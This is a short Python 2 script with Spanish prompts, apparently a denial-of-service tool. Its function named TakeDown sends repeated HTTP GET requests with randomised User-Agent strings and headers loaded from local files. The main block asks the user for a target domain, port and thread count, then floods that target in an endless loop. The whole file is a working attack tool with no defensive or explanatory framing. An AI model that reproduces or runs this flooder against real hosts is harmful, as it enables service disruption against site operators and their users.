import threading
import socket
import random
import sys

global headers,UsAg,host,port

def UserAgent():
    userAg=[]
    File=open("C:/PentestBox/bin/WebApplications/sqlmap/dos/UserAgent.txt","r")
    for line in File:
        userAg.append(line)
    return userAg
 
def TakeDown(host="",port=80):
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    except socket.error,msg:
        print"Error:",msg
    else:
        try:
            host=socket.gethostbyname(host)
        except socket.gaierror:
            print"Error resolviendo el dominio"
            sys.exit()
        else:
            packet = str("GET / HTTP/1.1\r\nHost: "+host+"\r\nUser-Agent: "+random.choice(UsAg)+"\r\n"+headers).encode('utf-8')
            if sock.connect_ex((host,port))==0:
                if sock.sendall(packet)==None:
                    print"paquete enviado !"
                    sock.close()
                else:
                    print"Error !"
                    sys.exit()
 
if __name__=="__main__":
    host=raw_input("Dominio: ")
    port=raw_input("Puerto: ")
    threads=raw_input("#Hilos: ")
    threads=int(threads)
    port=int(port)
    UsAg=UserAgent()
   
    fp=open("C:/PentestBox/bin/WebApplications/sqlmap/dos/headers.txt","r")
    headers=fp.read()
    fp.close()
    while True:
        for i in range(threads):
            th=threading.Thread(target=TakeDown,args=(host,port,),name="User-"+str(1))
            th.Daemon=True 
            th.start()
            th.join()
